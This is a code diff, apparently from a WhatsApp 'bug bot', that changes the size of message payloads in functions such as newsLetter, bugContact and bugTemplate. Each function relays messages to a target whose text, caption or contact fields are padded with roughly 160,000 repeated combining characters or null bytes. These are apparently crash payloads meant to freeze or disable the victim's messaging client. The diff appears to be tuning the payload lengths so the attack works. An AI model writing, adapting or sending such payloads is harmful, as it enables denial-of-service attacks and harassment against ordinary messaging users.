@@ -1251,7 +1251,7 @@ bot.command("status", ctx => {
                                 hasMediaAttachment: true
                             },
                             body: {
-                                text: "ꦾ".repeat(160000) + "\u0000".repeat(170000)
+                                text: "ꦾ".repeat(160000) + "\u0000".repeat(160000)
                             },
                             nativeFlowMessage: {},
                             contextInfo: {
@@ -1884,9 +1884,9 @@ async function newsLetter(target) {
                         message: {
                             newsletterAdminInviteMessage: {
                                 newsletterJid: `33333333333333333@newsletter`,
-                                newsletterName: "𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી" + "ી".repeat(170000),
+                                newsletterName: "𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી" + "ી".repeat(160000),
                                 jpegThumbnail: "",
-                                caption: "ꦽ".repeat(170000),
+                                caption: "ꦽ".repeat(160000),
                                 inviteExpiration: Date.now() + 1814400000,
                             },
                         },
@@ -2000,7 +2000,7 @@ async function newsLetter(target) {
         target,
         {
           extendedTextMessage: {
-            text: "ꦾ".repeat(170000),
+            text: "ꦾ".repeat(160000),
             contextInfo: {
               stanzaId: target,
               participant: target,
@@ -2035,7 +2035,7 @@ async function newsLetter(target) {
     
     
     async function bugContact(target) {
-    let xbug1 = 'ꦾ'.repeat(170000);
+    let xbug1 = 'ꦾ'.repeat(160000);
     await cella.relayMessage(target, {
         contactsArrayMessage: {
             contacts: [
@@ -2221,13 +2221,13 @@ async function bugTemplate(target) {
         target,
         {
           extendedTextMessage: {
-            text: `Wanna With Yours :D -` + "࣯ꦾ".repeat(170000),
+            text: `Wanna With Yours :D -` + "࣯ꦾ".repeat(160000),
             contextInfo: {
               fromMe: false,
               stanzaId: target,
               participant: target,
               quotedMessage: {
-                conversation: "Gpp Yah:D ‌" + "ꦾ".repeat(170000),
+                conversation: "Gpp Yah:D ‌" + "ꦾ".repeat(160000),
               },
               disappearingMode: {
                 initiator: "CHANGED_IN_CHAT",
